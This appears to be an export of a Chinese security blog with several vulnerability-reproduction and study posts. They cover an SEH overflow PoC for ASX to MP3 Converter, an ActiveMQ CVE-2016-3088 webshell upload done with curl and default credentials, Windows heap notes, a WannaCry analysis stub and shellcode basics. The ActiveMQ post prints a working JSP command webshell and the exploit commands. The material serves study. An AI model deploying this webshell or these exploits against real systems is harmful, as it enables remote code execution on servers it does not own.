alt="image-20200418090251250"></p><p>此时我们就可以简单计算一下从覆盖的起点（由图可知D159C）到最近一个SEH（由图可知DBFA4）有多远了，它们相减是43528，看来poc设置50000还是有考虑的，经过多次测算调试，poc中设置43483个A（前面一串路径占了部分位置），后面的八个字符即正好是SEH的位置，后面写利用脚本可以使用该位置。</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdvzrsqm24j30q40tkwux.jpg" alt="image-20200416224706440"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdvzkoktpij30e805st8t.jpg" alt="image-20200416224017391"></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdvzmf0clgj30g8055aa5.jpg" alt="image-20200416224157265"></p><p>看到这里有没有朋友发现奇怪的地方，在第二部分原博复现：我实际的操作第3步中分析了程序不像原博中一样执行到了最后而是在中间断开的原因，起端就是如下图这个位置堆栈DBFB4的非法数据mov进了ecx，最终导致内存读写错误，而DBFB4的非法数据从何而来我们从上图就可以一清二楚</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdwjvt9oetj315w0ng77f.jpg" alt="image-20200417102251074"></p><p>如果我们想要复现原博中的情况，让它执行到最后再跳转错误，只需要在构造poc时，中间多垫几层，在DBFB4位置输入一个合法地址就可以了，此时poc应该为</p><pre><code class="python">poc = &quot;\x41&quot; * 43483 SEH偏移poc += &quot;\x42\x42\x42\x42&quot;   ；覆盖Nsehpoc += &quot;\x41\x41\x41\x41&quot;   ;覆盖SEHpoc += &quot;\x90&quot;*8poc += &quot;\xCC\xC7\x10\x00&quot;  ；防止过程中内存读写出错构造的跳转地址rst = open(&quot;exploit.m3u&quot;,&#39;w&#39;)rst.write(poc)rst.close();</code></pre><p>构建地址后，成功继续向下走，分析过程就与原博基本相同了，但是在最后一步retn 4时，发现跳转为90909090也就是nop而不是A，仔细看堆栈，位置为DC5B8正好为防止内存出错构造地址的上一条</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gdxorir6p5j318m0d3gn5.jpg" alt="image-20200418095722792"></p><p>则poc进一步改为</p><pre><code class="python">poc = &quot;\x41&quot; * 43483 SEH偏移poc += &quot;\x42\x42\x42\x42&quot;   ；覆盖Nsehpoc += &quot;\x41\x41\x41\x41&quot;   ;覆盖SEHpoc += &quot;\x90&quot;*4poc += &quot;\x41\x41\x41\x41&quot;  ;原博程序末尾 retn 4 跳转的地址poc += &quot;\xCC\xC7\x10\x00&quot;  ；防止过程中内存读写出错构造的跳转地址rst = open(&quot;exploit.m3u&quot;,&#39;w&#39;)rst.write(poc)rst.close();</code></pre><p>至此分析结束，进一步的利用exp可以在这个poc基础上改。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>综合看下来，该漏洞并不是由于fopen而产生的，具体产生原因应该是应用程序自带的MSA2Mfilter03.dll组件内Playlist_FindNextItem函数解析恶意.M3U文件时不正确的边界检查引起的，溢出点在1000D3C3地址处，REP MOVS循环，其实是使用函数strcpy完成循环复制，问题就出现在strcpy函数，精心构造的POC可导致SEH指针被覆盖，因此在函数结束时，程序返回到一个不可读的地址，从而触发了异常处理流程，关键节点的地址均可在poc中改变，程序可控。</p><h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><p>ASX TO MP3本地代码执行漏洞 <a href="https://whereisk0shl.top/post/2016-11-04">https://whereisk0shl.top/post/2016-11-04</a></p><p>[翻译]Windows漏洞利用开发 - 第3部分：偏移更改和重定位模块 <a href="https://bbs.pediy.com/thread-225831.htm">https://bbs.pediy.com/thread-225831.htm</a></p><p>漏洞分析——ASX to MP3 Converter本地代码执行漏洞 <a href="https://ayesawyer.github.io/2019/07/08/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94ASX-to-MP3-Converter%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">https://ayesawyer.github.io/2019/07/08/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E2%80%94%E2%80%94ASX-to-MP3-Converter%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></p><p>Windows漏洞利用开发教程 Part 4：SEH <a href="https://www.freebuf.com/articles/system/170703.html">https://www.freebuf.com/articles/system/170703.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache ActiveMQ Fileserver漏洞组合复现</title>
      <link href="2020/02/02/Apache%20ActiveMQ%20Fileserver%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2020/02/02/Apache%20ActiveMQ%20Fileserver%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>目前网上的复现CVE-2016-3088方法基本固定：编写shell、上传到fileserver文件夹、利用move指令移到可以利用的地方，其中还需要爆出存放路径。</p><p>本文将该漏洞与CVE-2015-1830目录遍历相结合，利用curl完成全部利用过程。</p><a id="more"></a><h4 id="1-背景概述"><a href="#1-背景概述" class="headerlink" title="1. 背景概述"></a>1. 背景概述</h4><p>ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java 的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用。</p><p>2016年4月14日，国外安全研究人员 Simon Zuckerbraun 曝光 Apache ActiveMQ Fileserver 存在多个安全漏洞，可使远程攻击者用恶意代码替代Web应用，在受影响系统上执行远程代码（CVE-2016-3088）。</p><h4 id="2-漏洞环境搭建"><a href="#2-漏洞环境搭建" class="headerlink" title="2.漏洞环境搭建"></a>2.漏洞环境搭建</h4><p>1、官网下载apache-activemq-5.11.1-bin.tar 下载地址:<a href="http://activemq.apache.org/download-archives.html">http://activemq.apache.org/download-archives.html</a></p><p>2、解压</p><p>3、启动,进入bin目录下,运行./activemq start　<img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbhyvc5764j30y10ki439.jpg" alt="截屏2020-02-02下午12.57.58"></p><p>4、浏览器访问<a href="http://127.0.0.1:8186,如下图可以看到成功搭建环境">http://127.0.0.1:8186,如下图可以看到成功搭建环境</a></p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbhywqv2l0j30y10kiq7g.jpg" alt="截屏2020-02-02下午12.58.46"></p><h4 id="3-知道创宇404实验室的复现方法（该部分摘自404实验室博客原文）"><a href="#3-知道创宇404实验室的复现方法（该部分摘自404实验室博客原文）" class="headerlink" title="3.知道创宇404实验室的复现方法（该部分摘自404实验室博客原文）"></a>3.知道创宇404实验室的复现方法（该部分摘自404实验室博客原文）</h4><p>首先 PUT 一个 Jsp 的 Webshell 到 fileserver 目录</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbhyyd6pv6j30nr09374k.jpg" alt="img"></p><p>在 fileserver/ 目录中 Webshell 并没有执行权限</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbhyycen6hj30r804l74p.jpg" alt="img"></p><p>利用该版本存在物理路径泄露漏洞,爆一下绝对路径</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbhyye3hzhj310803x0ss.jpg" alt="img"></p><p>这一步也可以利用默认的ActiveMQ帐户和密码为<code>admin</code>，访问<code>http://your-ip:8161/admin/test/systemProperties.jsp</code>以查看ActiveMQ的绝对路径：</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbhz5050c6j31bb0u0ql8.jpg" alt="截屏2020-02-02下午1.07.12"></p><p>然后利用 MOVE 方法将 Webshell 移入 admin/ 目录（也可以利用相对路径）</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbhyycmywvj30sf04edfv.jpg" alt="img"></p><p>访问<a href="http://localhost:8161/admin/1.jsp?cmd=ls">http://localhost:8161/admin/1.jsp?cmd=ls</a> ，命令成功执行，效果如下</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbhyydn04gj30m80dg75v.jpg" alt="img"></p><h4 id="4-我的复现过程"><a href="#4-我的复现过程" class="headerlink" title="4.我的复现过程"></a>4.我的复现过程</h4><p>1.首先编写一个cmd.js，内容主要如下：</p><pre><code class="jsp">&lt;%@ page import=&quot;java.util.*,java.io.*&quot;%&gt;   &lt;%   %&gt;   &lt;HTML&gt;&lt;BODY&gt;   Commands with JSP   &lt;FORM METHOD=&quot;GET&quot; NAME=&quot;myform&quot; ACTION=&quot;&quot;&gt;   &lt;INPUT TYPE=&quot;text&quot; NAME=&quot;cmd&quot;&gt;   &lt;INPUT TYPE=&quot;submit&quot; VALUE=&quot;Send&quot;&gt;   &lt;/FORM&gt;   &lt;pre&gt;   &lt;%   if (request.getParameter(&quot;cmd&quot;) != null) &#123;   out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;&lt;BR&gt;&quot;);   Process p = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));   OutputStream os = p.getOutputStream();   InputStream in = p.getInputStream();   DataInputStream dis = new DataInputStream(in);   String disr = dis.readLine();   while ( disr != null ) &#123;   out.println(disr);   disr = dis.readLine();   &#125;   &#125;   %&gt;   &lt;/pre&gt;   &lt;/BODY&gt;&lt;/HTML&gt;  </code></pre><p>将其放置在cmd的默认路径下，默认一般是：C:\Users\用户名 或者C:\Users\admin</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbhzo65f57j30la0dwwgv.jpg" alt="截屏2020-02-02下午1.25.39"></p><p>打开cmd，利用”..\”的便利目录漏洞，输入如下命令</p><pre><code class="shell">curl -u admin:admin -v -X PUT --data &quot;@cmd.jsp&quot; http://TARGET:8161/fileserver/..\\admin\\cmd.jsp</code></pre><p>两个admin是默认的服务用户名和密码</p><p>该条命令直接把cmd.jsp上传到admin的目录下</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbhzt9c2zlj30la0dwaco.jpg" alt="截屏2020-02-02下午1.30.30"></p><p>在cmd中利用curl用GET直接利用命令：</p><pre><code class="shell">curl -u admin:admin -v -X GET http://TARGET:8161/admin/cmd.jsp?cmd=calc.exe</code></pre><p><img src="https://tva1.sinaimg.cn/large/006tNbRwgy1gbhzx6nio1j30la0dwjtm.jpg" alt="截屏2020-02-02下午1.34.00"></p><p>可以看到成功弹出计算器，利用成功</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>堆的知识与利用（0day2）</title>
      <link href="2020/01/14/%E5%A0%86%E7%9A%84%E7%9F%A5%E8%AF%86%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
      <url>2020/01/14/%E5%A0%86%E7%9A%84%E7%9F%A5%E8%AF%86%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>由于微软公司并没有完全公开其操作系统中堆管理的细节。因而到目前为止，对于 Windows 堆的了解主要是源于许多安全专家、技术爱好者的研究成果。并且基于堆的溢出攻击一度被认为是不太可能的。但是自从 Matt Conover 在CanSecWest 2004 黑客大会上发表了关于 Windows下堆溢出利用的演讲后，研究人员才逐渐开始把视线转移到基于堆的缓冲区溢出研究中来。</p><p>另外，值得提出的是，堆与栈是两种完全不同的内存表现形式。栈只有 POP和 PUSH 两种操作，管理机制相对比较简单。而堆在内存中的形式则比较凌乱，显得无序，并且使用后需要程序员自行释放内存，否则会造成内存泄漏。因而利用堆溢出的攻击也相对较难。</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaw5g912c7j320f0rsqlh.jpg" alt="image-20200114160233870"></p><a id="more"></a><h2 id="堆的基础知识"><a href="#堆的基础知识" class="headerlink" title="堆的基础知识"></a>堆的基础知识</h2><p>序员在使用堆时只需要做三件事情：申请一定大小的内存，使用内存，释放内存。我们下面将站在实现一个堆管理机制的设计者角度，来看看怎样才能向程序员提供这样透明的操作。<br>对于堆管理系统来说，响应程序的内存使用申请就意味着要在“杂乱”的堆区中“辨别”出哪些内存是正在被使用的，哪些内存是空闲的，并最终“寻找”到一片“恰当”的空闲内存区域，以指针形式返回给程序。<br>（1）“杂乱”是指堆区经过反复的申请、释放操作之后，原本大片连续的空闲内存区可能呈现出大小不等且空闲块、占用块相间隔的凌乱状态。<br>（2）“辨别”是指堆管理程序必须能够正确地识别哪些内存区域是正在被程序使用的占用块，哪些区域是可以返回给当前请求的空闲块。<br>（3）“恰当”是指堆管理程序必须能够比较“经济”地分配空闲内存块。如果用户申请使用8个字节，而返回给用户一片512字节的连续内存区域并将其标记成占用状态，这将造成大量的内存浪费，以致出现明明有内存却无法满足申请请求的情况。</p><p>为了完成这些基本要求，必须设计一套高效的数据结构来配合算法。现代操作系统的堆数据结构一般包括堆块和堆表两类。<br><strong>堆块</strong>：出于性能的考虑，堆区的内存按不同大小组织成块，以堆块为单位进行标识，而不是传统的按字节标识。一个堆块包括两个部分：块首和块身。块首是一个堆块头部的几个字节，用来标识这个堆块自身的信息，例如，本块的大小、本块空闲还是占用等信息；块身是紧跟在块首后面的部分，也是最终分配给用户使用的数据区。<br>提示：<u>堆管理系统所返回的指针一般指向块身的起始位置，在程序中是感觉不到块首的存在的</u>。然而，连续地进行内存申请时，如果您够细心，<u>可能会发现返回的内存之间存在“空隙”，那就是块首！</u><br><strong>堆表</strong>：堆表一般位于堆区的起始位置，用于索引堆区中所有堆块的重要信息，包括堆块的位置、堆块的大小、空闲还是占用等。堆表的数据结构决定了整个堆区的组织方式，是快速检索空闲块、保证堆分配效率的关键。堆表在设计时可能会考虑采用平衡二叉树等高级数据结构用于优化查找效率。现代操作系统的堆表往往不止一种数据结构。</p><p>堆的内存组织结构如下图：</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaw5n5u56rj315k0rs78m.jpg" alt="image-20200114160914791"></p><p>Windows中，<u>占用态的堆块被使用它的程序索引</u>，而<u>堆表只索引所有空闲态的堆块</u>。其中，最重要的堆表有两种：空闲双向链表Freelist（以下简称空表）和快速单向链表Lookaside（以下简称快表）。</p><h3 id="1-空表"><a href="#1-空表" class="headerlink" title="1.空表"></a>1.空表</h3><p>空闲堆块的块首中包含一对重要的指针，这对指针用于将空闲堆块组织成双向链表。按照堆块的大小不同，空表总共被分为128条。</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaw5tqn8a1j31980u0e3z.jpg" alt="image-20200114161450223"></p><p>堆区一开始的堆表区中有一个128项的指针数组，被称做空表索引（Freelist array）。该数组的每一项包括两个指针，用于标识一条空表。<br>如图所示，空表索引的第二项（free[1]）标识了堆中所有大小为8字节的空闲堆块，之后每个索引项指示的空闲堆块递增8字节，例如，free[2]标识大小为16字节的空闲堆块，free[3]标识大小为24字节的空闲堆块，free[127]标识大小为1016字节的空闲堆块。因此有：<br>空闲堆块的大小＝索引项（ID）×8（字节）<br>把空闲堆块按照大小的不同链入不同的空表，可以方便堆管理系统高效检索指定大小的空闲堆块。需要注意的是，空表索引的第一项（free[0]）所标识的空表相对比较特殊。这条双向链表链入了所有大于等于1024字节的堆块（小于512KB）。这些堆块按照各自的大小在零号空表中升序地依次排列下去，您会在稍后发现这样组织的好处。</p><h3 id="2-快表"><a href="#2-快表" class="headerlink" title="2.快表"></a>2.快表</h3><p>快表是Windows用来加速堆块分配而采用的一种堆表。这里之所以把它叫做“快表”是因为这类单向链表中从来不会发生堆块合并（其中的空闲块块首被设置为占用态，用来防止堆块合并）。<br>快表也有128条，组织结构与空表类似，只是其中的堆块按照单链表组织。快表总是被初始化为空，而且每条快表最多只有4个结点，故很快就会被填满。</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaw5z3brr4j30py0m7q5j.jpg" alt="image-20200114162043122"></p><p>堆中的操作可以分为堆块分配、堆块释放和堆块合并（Coalesce）三种。其中，“分配”和“释放”是在程序提交申请和执行的，而堆块合并则是由堆管理系统自动完成的。</p><h3 id="1-堆块分配"><a href="#1-堆块分配" class="headerlink" title="1.堆块分配"></a>1.堆块分配</h3><p>堆块分配可以分为三类：<u>快表分配、普通空表分配和零号空表（free[0]）分配</u>。<br>从快表中分配堆块比较简单，包括寻找到大小匹配的空闲堆块、将其状态修改为占用态、把它从堆表中“卸下”、最后返回一个指向堆块块身的指针给程序使用。<br>普通空表分配时首先寻找最优的空闲块分配，若失败，则寻找次优的空闲块分配，即最小的能够满足要求的空闲块。<br>零号空表中按照大小升序链着大小不同的空闲块，故在分配时先从free[0]反向查找最后一个块（即表中最大块），看能否满足要求，如果能满足要求，再正向搜索最小能够满足要求的空闲堆块进行分配（这就明白为什么零号空表要按照升序排列了）。<br>堆块分配中的“找零钱”现象：当空表中无法找到匹配的“最优”堆块时，一个稍大些的块会被用于分配。这种次优分配发生时，会先从大块中按请求的大小精确地“割”出一块进行分配，然后给剩下的部分重新标注块首，链入空表。这里体现的就是堆管理系统的“节约”原则：买东西的时候用最合适的钞票，如果没有，就要找零钱，决不会玩大方。<br>由于快表只有在精确匹配时才会分配，故不存在“找钱”现象。</p><h3 id="2-堆块的释放"><a href="#2-堆块的释放" class="headerlink" title="2.堆块的释放"></a>2.堆块的释放</h3><p>释放堆块的操作包括将堆块状态改为空闲，链入相应的堆表。所有的释放块都链入堆表的末尾，分配的时候也先从堆表末尾拿。<br>另外需要强调，快表最多只有4项。</p><h3 id="3-堆块的合并"><a href="#3-堆块的合并" class="headerlink" title="3.堆块的合并"></a>3.堆块的合并</h3><p>经过反复的申请与释放操作，堆区很可能变得“千疮百孔”，产生很多内存碎片。为了合理有效地利用内存，堆管理系统还要能够进行堆块合并操作，如图所示。<br>当堆管理系统发现两个空闲堆块彼此相邻的时候，就会进行堆块合并操作。<br>堆块合并包括将两个块从空闲链表中“卸下”、合并堆块、调整合并后大块的块首信息（如大小等）、将新块重新链入空闲链表。</p><p>在具体进行堆块分配和释放时，根据操作内存大小的不同，Windows采取的策略也会有所不同。可以把内存块按照大小分为三类：<br>小块：SIZE&lt;1KB<br>大块：1KB≤SIZE&lt;512KB<br>巨块：SIZE≥512KB</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaw6e25csoj30wi0u04qp.jpg" alt="image-20200114163505782"></p><p>对应的分配和释放算法也有三类，我们可以通过下表来理解Windows的堆管理策略。</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbch0sys86j317k0m8aen.jpg" alt="image-20200114163603753"></p><p>最后，再强调一下Windows堆管理的几个要点。<br>（1）快表中的空闲块被设置为占用态，故不会发生堆块合并操作。<br>（2）快表只有精确匹配时才会分配，不存在“搜索次优解”和“找零钱”现象。<br>（3）快表是单链表，操作比双链表简单，插入删除都少用很多指令。<br>（4）综上所述，快表很“快”，故在分配和释放时总是优先使用快表，失败时才用空表。<br>（5）快表只有4项，很容易被填满，因此空表也是被频繁使用的。<br>综上所述，Windows的堆管理策略兼顾了内存合理使用、分配效率等多方面的因素。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>永恒之蓝（待完善）</title>
      <link href="2019/12/25/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
      <url>2019/12/25/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</url>
      
        <content type="html"><![CDATA[<p>开始准备后桌面</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga995azo1ij31fe0u0hdt.jpg" alt="截屏2019-12-25下午8.00.21"></p><p>查壳</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga9a6dpzqqj311z0u07n6.jpg" alt="image-20191225211808440"></p><a id="more"></a><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga995pyht1j31fe0u0x2b.jpg" alt="截屏2019-12-25下午8.02.06"></p><p>运行后生成文件</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga996dcqtcj31fe0u0dpv.jpg" alt="截屏2019-12-25下午8.05.59"></p><p>后果</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga996m8tn0j31ee0u04qp.jpg" alt="截屏2019-12-25下午8.20.42"></p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1ga996pp3ewj311z0u0tfm.jpg" alt="截屏2019-12-25下午8.24.12"></p><p>##静态基础分析</p><p>查看字符串</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaa8xrpeycj31gj0u0grh.jpg" alt="截屏2019-12-26下午5.18.08"></p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gaa8z58ll9j31qe0ag75h.jpg" alt="image-20191226172208609"></p><p>peid识别加密算法</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbcgqz9e5zj311z0u0qbl.jpg" alt="image-20191225213044233"></p><p>查找导入表</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbda7ldlcnj318i0cg406.jpg" alt="截屏2019-12-26下午5.32.39"></p><p><img src="/Users/fstark/Desktop/%E6%88%AA%E5%B1%8F2019-12-26%E4%B8%8B%E5%8D%885.33.41.png" alt="截屏2019-12-26下午5.32.39"></p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbda7y1dlij317c0og79g.jpg" alt="截屏2019-12-26下午5.36.07"></p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbda86vmqpj317c0ogtem.jpg" alt="截屏2019-12-26下午5.38.27"></p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbda8h8qaxj317c0og429.jpg" alt="截屏2019-12-26下午5.38.52"></p><p>基础动态分析</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbda8vznr1j31n60u0qht.jpg" alt="截屏2019-12-26下午5.51.25"></p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbda93n2jej31n60u07ec.jpg" alt="截屏2019-12-26下午6.01.30"></p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbda9bn2nij31n60u07cv.jpg" alt="截屏2019-12-26下午7.54.46"></p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbda9im4j0j31n60u0dnd.jpg" alt="截屏2019-12-26下午8.00.11"></p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbda9qkkzoj31n60u0aex.jpg" alt="截屏2019-12-26下午8.11.33"></p><h2 id="使用IDA和OD进行详细分析"><a href="#使用IDA和OD进行详细分析" class="headerlink" title="使用IDA和OD进行详细分析"></a><strong><em>使用IDA和OD进行详细分析</em></strong></h2><p><strong><em>\</em>对wcry*****</strong>*.exe*<strong>**</strong>*病毒主程序的分析****</p><p><img src="/Users/fstark/Desktop/%E6%88%AA%E5%B1%8F2019-12-26%E4%B8%8B%E5%8D%888.33.03.png" alt="截屏2019-12-26下午8.33.03"></p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1gbdae0tfzcj31nu0jy777.jpg" alt="截屏2019-12-26下午8.33.50"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 病毒分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shellcode回顾（0day2）</title>
      <link href="2019/12/17/shellcode/"/>
      <url>2019/12/17/shellcode/</url>
      
        <content type="html"><![CDATA[<p>这几个月因为一些原因，工控的事情要先放一放了。现在在做漏洞挖掘的一些事情，其实9月末就将0day2看了不少，可以过了这么长时间又给还回去了。说起来好笑，重新拾起winDbg调试的时候，我是看着9月初自己写的新手教程一步一步又熟悉起来的，所以这一边看的时候还是好好记录一下吧，避免学了又还给老师。</p><a id="more"></a><h3 id="什么是shellcode？"><a href="#什么是shellcode？" class="headerlink" title="什么是shellcode？"></a>什么是shellcode？</h3><p>shellcode是指缓冲区溢出攻击中植入进程的代码。这个代码是什么都可以，可以是一个恶作剧的弹框，可以是弹出一个系统自带的计算器，也可以是一个木马病毒。</p><p>与之相关的还有一个名词exploit，它与shellcode的关系就像是导弹主体与导弹弹头的关系，用0day2中的图片最是生动形象：</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9zt1y50cyj31ac0pxag3.jpg" alt="image-20191217163548201"></p><p>shellcode是个精细活，也不是直接怼就能怼出来的，至少需要解决以下几个比较关键的问题：</p><ul><li><p>从调试器中抄出来的shellcode起始地址下一次就变了，需要想办法让程序能够自动定位到shellcode的起始地址（定位shellcode）</p></li><li><p>缓冲区内除了shellcode，还有一些用于填充的数据，这些数据如何编写</p></li><li><p>不同机器不同操作系统中同一个API函数入口地址往往有差异，需要想办法让shellcode自己运行时动态的获取当前系统API地址</p></li><li><p>部分软件有对缓冲区的限制以及IDS等检查，如何对shellode进行进一步编写使其能绕过</p></li><li><p>在缓存区十分有限的情况下如何尽量让shellcode尺寸更加精炼</p><p>###定位shellcode</p><p>使用OD直接获取shellcode地址并覆盖返回函数在当时可以执行，但是重新加载后就不一定。</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9ztrhids5j311y0u01kx.jpg" alt="image-20191217170023036"></p></li></ul><p>根据前人调试程序获取的经验，函数在返回时，ESP所指的位置恰好是溢出淹没的返回地址的下一个位置。，这样我们就可以利用该特性精心构造一个“跳板”。</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9ztz80rrfj30m80ngn76.jpg" alt="image-20191217170754307"></p><p>这种定位shellcode的方法使用进程空间里一条jmp esp指令作为“跳板”，不论栈帧怎么“移位”，都能够精确地跳回栈区，从而适应程序运行中shellcode内存地址的动态变化。</p><p>想要找到ESP的地址，可以使用各种工具中自带的插件，也可以使用以下的c程序。</p><pre><code class="c">#include &lt;windows.h&gt;￼#include &lt;stdio.h&gt;￼#define DLL_NAME &quot;user32.dll&quot;￼main()￼&#123;￼BYTE* ptr;￼int position,address;￼HINSTANCE handle;￼BOOL done_flag = FALSE;￼    handle=LoadLibrary(DLL_NAME);￼if(!handle)￼&#123;￼    printf(&quot; load dll erro !&quot;);￼  exit(0);￼&#125;￼ptr = (BYTE*)handle;￼for(position = 0; !done_flag; position++)￼&#123;￼    try￼  &#123;￼      if(ptr[position] == 0xFF &amp;&amp; ptr[position+1] == 0xE4)￼    &#123;￼        //0xFFE4 is the opcode of jmp esp￼           int address = (int)ptr + position;￼         printf(&quot;OPCODE found at 0x%x\n&quot;,address);￼    &#125;￼  &#125;￼  catch(...)￼  &#123;￼      int address = (int)ptr + position;￼      printf(&quot;END OF 0x%x\n&quot;, address);￼      done_flag = true;￼  &#125;￼ &#125;￼&#125;</code></pre><h3 id="缓冲区组成"><a href="#缓冲区组成" class="headerlink" title="缓冲区组成"></a>缓冲区组成</h3><p>送入缓冲区的数据可以分为以下几种。<br>（1）填充物：可以是任何值，但是一般用NOP指令对应的0x90来填充缓冲区，并把shellcode布置于其后。这样即使不能准确地跳转到shellcode的开始，只要能跳进填充区，处理器最终也能顺序执行到shellcode。<br>（2）淹没返回地址的数据：可以是跳转指令的地址、shellcode起始地址，甚至是一个近似的shellcode的地址。<br>（3）shellcode：可执行的机器代码。<br>在缓冲区中怎样摆放shellcode对exploit的成功至关重要。</p><p><img src="https://tva1.sinaimg.cn/large/006tNbRwly1g9zuel3opqj30m80f6gq8.jpg" alt="image-20191217172239708"></p><p>如果缓冲区较大，更推荐把shellcode布置在缓冲区内，有以下好处：</p><p>（1）合理利用缓冲区，使攻击串的总长度减小：对于远程攻击，有时所有数据必须包含在一个数据包中！<br>（2）对程序破坏小，比较稳定：溢出基本发生在当前栈帧内，不会大范围破坏前栈帧。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>控制器固件逆向分析实践（以施耐德NOE 771为例）</title>
      <link href="2019/10/29/%E6%8E%A7%E5%88%B6%E5%99%A8%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E8%B7%B5/"/>
      <url>2019/10/29/%E6%8E%A7%E5%88%B6%E5%99%A8%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%E5%AE%9E%E8%B7%B5/</url>
      
        <content type="html"><![CDATA[<h2 id="【实验要求】"><a href="#【实验要求】" class="headerlink" title="【实验要求】"></a>【实验要求】</h2><p>针对施耐德NOE 771固件进行逆向分析，并获取到隐藏在汇编代码中的后门账号。</p><a id="more"></a><h2 id="【实验目的】"><a href="#【实验目的】" class="headerlink" title="【实验目的】"></a>【实验目的】</h2><p>理解固件逆向对于安全工作的意义；熟悉主要的固件逆向工具和方法；掌握IDA Pro进行静态分析的使用方式；掌握Binwalk对文件和固件的一般分析方法；</p><h2 id="【实验原理】"><a href="#【实验原理】" class="headerlink" title="【实验原理】"></a>【实验原理】</h2><h3 id="1-固件"><a href="#1-固件" class="headerlink" title="1.固件"></a>1.固件</h3><p>在计算机领域中固件（firmware）是一种为设备提供控制、监控、数据操作等功能的微型系统。嵌入式设备就是一些典型的含有固件的设备，BIOS也是固件的一种，同样的我们经常使用的硬盘设备也有其自己的固件。</p><h3 id="2-VXworks"><a href="#2-VXworks" class="headerlink" 